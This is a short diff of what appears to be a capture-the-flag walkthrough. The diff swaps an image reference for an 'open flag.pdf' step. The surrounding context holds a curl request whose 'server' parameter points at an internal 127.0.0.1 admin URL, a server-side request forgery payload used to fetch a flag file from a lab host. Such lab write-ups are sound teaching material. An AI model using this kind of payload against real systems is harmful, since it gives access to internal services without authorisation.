@@ -264,7 +264,9 @@ curl "http://10.65.161.138/download?id=1&server=http://127.0.0.1:8087/admin?" \
   --output flag.pdf
 ```
 
-![Nmap Scan](flag2_0.png)
+```bash
+open flag.pdf
+```
 
 ![Nmap Scan](flag2.png)
 
